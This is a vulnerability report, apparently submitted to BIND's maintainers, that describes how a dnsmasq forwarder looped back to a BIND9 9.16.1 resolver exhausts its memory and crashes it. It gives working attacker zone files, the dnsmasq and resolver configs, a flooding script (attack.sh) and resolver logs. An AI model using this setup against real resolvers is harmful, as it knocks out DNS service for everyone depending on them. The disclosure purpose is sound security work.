#Using dnsmasq to make bind9 resolver crash.md
### Summary

The BIND9 resolver contains a vulnerability where an attacker can exploit it by delegating domain queries to a dnsmasq forwarder (whose forwarder is the victim's BIND9 resolver). This causes the BIND9 resolver and the dnsmasq forwarder to exchange a large volume of oversized data packets, while simultaneously forcing the BIND9 resolver to continuously traverse its cache, consuming resources until they are exhausted, ultimately leading to process crash.

### BIND versions affected

BIND 9.16.1-Ubuntu (Stable Release) <id:d497c32>



### Preconditions and assumptions

The attacker needs to control two authoritative DNS servers and one dnsmasq forwarder. The attack setup involves the following steps:
On Authoritative DNS Server A, configure a large number of NS records pointing to Authoritative DNS Server B.

On Authoritative DNS Server B, configure corresponding A records pointing to the dnsmasq forwarder.

Set the dnsmasq forwarder's forwarder to point to the target BIND9 resolver.

The attacker can then initiate the attack either by querying the controlled dnsmasq forwarder or by directly querying the target BIND9 resolver.

### Attacker's abilities

The attacker needs to control two authoritative DNS servers and one dnsmasq forwarder. The attack setup involves the following steps:
On Authoritative DNS Server A, configure a large number of NS records pointing to Authoritative DNS Server B.
On Authoritative DNS Server B, configure corresponding A records pointing to the dnsmasq forwarder.
Set the dnsmasq forwarder's forwarder to point to the target BIND9 resolver.
Additionally, the attacker needs to be capable of concurrently executing a large volume of DNS query requests.



### Impact

After launching the attack, the parser continuously traversed the cache, causing the CPU usage to rise steadily, memory consumption to increase progressively, and related cache data to be sent to dnsmasq repeatedly. Eventually, the named process consumed an excessive amount of memory, leading to its immediate shutdown. (A single domain name query was sufficient to overload the resolver's CPU for more than 30 seconds.)




### Steps to reproduce

1.use the attached configuration file. We need to configure two authoritative  name servers and one dnsmasq forwarder.

env file

```
BIND9_VERSION=9.16.1
DNSMASQ_IP=172.16.114.11
ROOT_SERVER_IP=172.16.114.103
TOP_LEVEL_SERVER_IP=172.16.114.104
FUN_TOP_LEVEL_SERVER_IP=172.16.114.105
VICTIM_SERVER2_IP=172.16.114.13
ATTACK_SERVER2_IP=172.16.114.15
RESOLVER_SERVER1_IP=172.16.114.18
```

Authoritative name server A

/etc/bind/named.conf

```
options {
    directory "/var/named";
    allow-query { any; };
    recursion no;
    listen-on { any; };
    dnssec-validation no;
    forwarders {};
};
logging {
    channel default_file {
        file "/var/log/named.log" versions 3 size 5m;
        severity info;
        print-time yes;
        print-severity yes;
        print-category yes;
    };
    category default { default_file; };

};

zone "attack2.com" IN {
    type master;
    file "/etc/bind/attack2.com.zone";   
};
```

/etc/bind/attack2.com.zone

```
$TTL 65535
@   IN  SOA ns1.attack2.com. admin.attack2.com. (
            2024102901 ;
            3600       ;
            1800       ;
            1209600    ;
            65535      ;
        )
    IN  NS  ns1.attack2.com.

ns1.attack2.com. IN  A   172.16.114.15      ;
www.attack2.com. IN  A   8.210.5.115     ;

a1.attack2.com. IN NS 1a1.victim2.com.
a1.attack2.com. IN NS 1a2.victim2.com.
a1.attack2.com. IN NS 1a3.victim2.com.
a1.attack2.com. IN NS 1a4.victim2.com.
                 ……
a1.attack2.com. IN NS 2a1500.victim2.com.
a2.attack2.com. IN NS 2a1.victim2.com.
a2.attack2.com. IN NS 2a2.victim2.com.
                 ……
a2.attack2.com. IN NS 2a1500.victim2.com.
                 ……
a100.attack2.com. IN NS 100a1.victim2.com.
a100.attack2.com. IN NS 100a2.victim2.com.
                 ……
a100.attack2.com. IN NS 100a1500.victim2.com.
                 ……
z1.attack2.com. IN NS 1z1.victim2.com.
z1.attack2.com. IN NS 1z2.victim2.com.
                 ……
z100.attack2.com. IN NS 100z1.victim2.com.
                 ……
z100.attack2.com. IN NS 100z1500.victim2.com.
```

Authoritative name server B

named.conf

```
options {
    directory "/var/named";
    allow-query { any; };
    recursion no;
    listen-on { any; };
    dnssec-validation no;
    forwarders {};
};
logging {
    channel default_file {
        file "/var/log/named.log" versions 3 size 5m;
        severity info;
        print-time yes;
        print-severity yes;
        print-category yes;
    };
    category default { default_file; };

};

zone "victim2.com" IN {
    type master;
    file "/etc/bind/victim2.com.zone";   
};
```

/etc/bind/victim2.com.zone

```
$TTL 65535
@   IN  SOA ns1.victim2.com. admin.victim2.com. (
            2024102901 ;
            3600       ;
            1800       ;
            1209600    ;
            65535      ;
        )
    IN  NS  ns1.victim2.com.

ns1.victim2.com. IN  A   172.16.114.13    ;
www.victim2.com. IN  A   8.210.5.115      ;

1a1.victim2.com. IN A 172.16.114.11
1a2.victim2.com. IN A 172.16.114.11
1a3.victim2.com. IN A 172.16.114.11
                 ……
100z1500.victim2.com. IN A 172.16.114.11
```

dnsmasq

/etc/dnsmasq.conf

```
no-hosts
no-resolv

server=172.16.114.18

interface=eth0
```

Victim resolver

named.conf

```
options {
    directory "/var/named";
    recursion yes;
    allow-recursion { any; };
    listen-on { any; };
    listen-on-v6 { any; };
    dnssec-validation no;
    forwarders {};
    resolver-query-timeout 200000;
    max-recursion-depth 150000;
    max-recursion-queries 150000;
};
logging {
    channel query_log {
        file "/var/log/named.log" versions 3 size 5m;
        severity info;
        print-time yes;
        print-severity yes;
        print-category yes;
    };
    category queries { query_log;};
};
zone "." IN {
    type hint;
    file "/etc/bind/root.hints";
};
```

2.Start the BIND server with command:`named -g -c /etc/bind/named.conf `

3.Simulate attack traffic using the command

```
./attack.sh
TARGET_IPS: 172.16.114.18
Attack_DOMAIN_PREFIX: attack2.com
```

attack.sh

```shell
read -p "TARGET_IPS: " TARGET_IPS
read -p "Attack_DOMAIN_PREFIX: " DOMAIN_PREFIX

while true; do
echo {a..z}{1..20} | tr ' ' '\n' | parallel -j 0 dig @"${TARGET_IPS}" {}.${DOMAIN_PREFIX} &
echo {a..z}{21..40} | tr ' ' '\n' | parallel -j 0 dig @"${TARGET_IPS}" {}.${DOMAIN_PREFIX} &
echo {a..z}{41..60} | tr ' ' '\n' | parallel -j 0 dig @"${TARGET_IPS}" {}.${DOMAIN_PREFIX} &
echo {a..z}{61..80} | tr ' ' '\n' | parallel -j 0 dig @"${TARGET_IPS}" {}.${DOMAIN_PREFIX} &
echo {a..z}{81..100} | tr ' ' '\n' | parallel -j 0 dig @"${TARGET_IPS}" {}.${DOMAIN_PREFIX}
done
```

### What is the current *bug* behavior?

The BIND9 resolver stores an excessive number of NS records in its cache. Upon receiving requests from dnsmasq, it returns all related cached data to dnsmasq, which in turn sends the entire cache back. This results in the exhaustion of memory resources on the BIND9 resolver, ultimately causing the server to crash.

### What is the expected *correct* behavior?

The BIND9 resolver should not store all NS records in its cache. Additionally, requests from forwarders like dnsmasq should be treated the same as those from regular users, only returning domain resolution results or responses such as SERVFAIL or NXDOMAIN.

The characteristics of the attack traffic are as follows:  

1. **TCP packets**: The TCP packets contain all the NS records and A records related to the queried domain.  
2. **The attack traffic generation process**:  
   A. The BIND9 resolver first locates the dnsmasq forwarder through a delegation query.  
   B. The dnsmasq forwarder then forwards the request to the BIND9 resolver.  
   C. The BIND9 resolver sends all the records cached during the delegation process to dnsmasq via TCP packets.  
   D. dnsmasq forwards the received TCP packets back to the BIND9 resolver.


### Relevant logs

The request log generated by querying the resolver once for a1.attack2.com is as follows:

```
12-Mar-2025 07:32:59.332 client @0x7f1244000cd0 172.16.0.1#42827 (a1.attack2.com): query: a1.attack2.com IN A +E(0)K (172.16.114.18)
12-Mar-2025 07:32:59.336 resolver priming query complete
12-Mar-2025 07:32:59.992 client @0x7f12e0000cd0 172.16.114.11#44137 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCK (172.16.114.18)
12-Mar-2025 07:33:00.092 client @0x7f1288007640 172.16.114.11#49574 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.172 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.176 client @0x7f1358000cd0 172.16.114.11#51312 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.220 client @0x7f1288007640 172.16.114.11#49578 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.284 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.284 client @0x7f137c000cd0 172.16.114.11#47375 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.308 client @0x7f1288007640 172.16.114.11#49592 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.376 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.376 client @0x7f12a4000cd0 172.16.114.11#51168 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.396 client @0x7f1288007640 172.16.114.11#49594 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.464 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.464 client @0x7f1240000cd0 172.16.114.11#34656 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.508 client @0x7f124000b920 172.16.114.11#49602 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.564 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.564 client @0x7f1350000cd0 172.16.114.11#37698 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.596 client @0x7f1288007640 172.16.114.11#49604 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.664 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.664 client @0x7f12c4000cd0 172.16.114.11#39960 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.696 client @0x7f1288007640 172.16.114.11#49618 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.760 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.760 client @0x7f1270000cd0 172.16.114.11#54248 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.804 client @0x7f126c007640 172.16.114.11#49630 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.872 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.872 client @0x7f12d4000cd0 172.16.114.11#42167 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.916 client @0x7f124000b920 172.16.114.11#49638 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:00.972 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:00.972 client @0x7f1338000cd0 172.16.114.11#55854 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:00.992 client @0x7f12b4007640 172.16.114.11#49652 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.056 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.056 client @0x7f1244007570 172.16.114.11#54024 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.100 client @0x7f12b4007640 172.16.114.11#49668 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.168 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.168 client @0x7f12f0000cd0 172.16.114.11#33510 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.212 client @0x7f12b4007640 172.16.114.11#49670 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.276 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.276 client @0x7f1240000cd0 172.16.114.11#44319 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.320 client @0x7f124000b920 172.16.114.11#49672 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.372 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.372 client @0x7f1374000cd0 172.16.114.11#34723 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.404 client @0x7f12b4007640 172.16.114.11#49682 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.468 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.472 client @0x7f12c0000cd0 172.16.114.11#47086 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.512 client @0x7f12b4007640 172.16.114.11#49692 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.580 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.580 client @0x7f12c0000cd0 172.16.114.11#55056 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.624 client @0x7f12b4007640 172.16.114.11#49706 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.692 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.692 client @0x7f136c000cd0 172.16.114.11#52704 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.712 client @0x7f12b4007640 172.16.114.11#49720 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.780 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.780 client @0x7f1350000cd0 172.16.114.11#33671 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.812 client @0x7f1268007640 172.16.114.11#49730 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.864 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.864 client @0x7f12f0000cd0 172.16.114.11#54930 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:01.908 client @0x7f12b4007640 172.16.114.11#49738 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:01.968 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:01.968 client @0x7f12e80bf6d0 172.16.114.11#42434 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.016 client @0x7f1288007640 172.16.114.11#49752 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.080 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.080 client @0x7f137c000cd0 172.16.114.11#59259 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.124 client @0x7f1288007640 172.16.114.11#49756 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.188 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.188 client @0x7f12ec000cd0 172.16.114.11#46436 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.236 client @0x7f1288007640 172.16.114.11#49760 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.296 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.300 client @0x7f12b8000cd0 172.16.114.11#51515 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.320 client @0x7f1288007640 172.16.114.11#49774 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.384 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.388 client @0x7f1308000cd0 172.16.114.11#51654 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.416 client @0x7f1288007640 172.16.114.11#49788 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.472 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.472 client @0x7f12980bf6d0 172.16.114.11#52162 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.516 client @0x7f1288007640 172.16.114.11#49790 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.580 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.580 client @0x7f1374000cd0 172.16.114.11#47256 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.612 client @0x7f1288007640 172.16.114.11#49798 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.676 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.676 client @0x7f1344000cd0 172.16.114.11#59352 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.724 client @0x7f1288007640 172.16.114.11#49804 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.784 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.784 client @0x7f1344000cd0 172.16.114.11#55957 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.816 client @0x7f1288007640 172.16.114.11#49820 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.884 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:02.884 client @0x7f1264000cd0 172.16.114.11#37302 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:02.928 client @0x7f1288007640 172.16.114.11#49836 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:02.996 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.000 client @0x7f127c000cd0 172.16.114.11#54073 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.040 client @0x7f1288007640 172.16.114.11#49850 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.104 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.108 client @0x7f12c8000cd0 172.16.114.11#46544 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.152 client @0x7f1288007640 172.16.114.11#49866 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.216 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.220 client @0x7f12c4000cd0 172.16.114.11#56909 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.260 client @0x7f1288007640 172.16.114.11#49880 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.328 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.328 client @0x7f1318000cd0 172.16.114.11#53131 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.376 client @0x7f1290007640 172.16.114.11#49896 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.428 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.432 client @0x7f12c8000cd0 172.16.114.11#42090 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.476 client @0x7f1288007640 172.16.114.11#49908 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.544 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.548 client @0x7f12f0000cd0 172.16.114.11#38523 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.592 client @0x7f1288007640 172.16.114.11#49922 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.655 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.655 client @0x7f12c4000cd0 172.16.114.11#54871 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.699 client @0x7f1288007640 172.16.114.11#49924 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.767 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.767 client @0x7f12980bf6d0 172.16.114.11#48047 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.811 client @0x7f1288007640 172.16.114.11#49938 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.879 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.879 client @0x7f1278000cd0 172.16.114.11#39964 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:03.911 client @0x7f1288007640 172.16.114.11#49954 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:03.979 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:03.979 client @0x7f1368000cd0 172.16.114.11#43365 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.023 client @0x7f1288007640 172.16.114.11#49958 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.091 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.091 client @0x7f12980bf6d0 172.16.114.11#60009 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.135 client @0x7f12b4007640 172.16.114.11#49964 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.203 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.203 client @0x7f134c000cd0 172.16.114.11#36523 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.247 client @0x7f1288007640 172.16.114.11#49966 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.311 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.315 client @0x7f1368000cd0 172.16.114.11#56227 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.339 client @0x7f12d8000cd0 172.16.0.1#51497 (a1.attack2.com): query: a1.attack2.com IN A +E(0)K (172.16.114.18)
12-Mar-2025 07:33:04.359 client @0x7f1288007640 172.16.114.11#49968 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.423 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.427 client @0x7f1250000cd0 172.16.114.11#54107 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.471 client @0x7f1288007640 172.16.114.11#49972 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.535 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.539 client @0x7f1364000cd0 172.16.114.11#54726 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.579 client @0x7f12b4007640 172.16.114.11#49982 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.643 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.643 client @0x7f1344000cd0 172.16.114.11#46908 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.687 client @0x7f1288007640 172.16.114.11#49998 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.751 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.755 client @0x7f1360000cd0 172.16.114.11#46092 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.787 client @0x7f1288007640 172.16.114.11#50010 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.851 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.851 client @0x7f1318000cd0 172.16.114.11#54401 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.895 client @0x7f1290007640 172.16.114.11#50020 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:04.951 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:04.951 client @0x7f12cc000cd0 172.16.114.11#37538 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:04.975 client @0x7f1288007640 172.16.114.11#50026 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.043 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.043 client @0x7f12d0000cd0 172.16.114.11#55705 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.087 client @0x7f1288007640 172.16.114.11#35300 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.155 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.155 client @0x7f12d8004fb0 172.16.114.11#57507 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.179 client @0x7f1288007640 172.16.114.11#35308 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.243 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
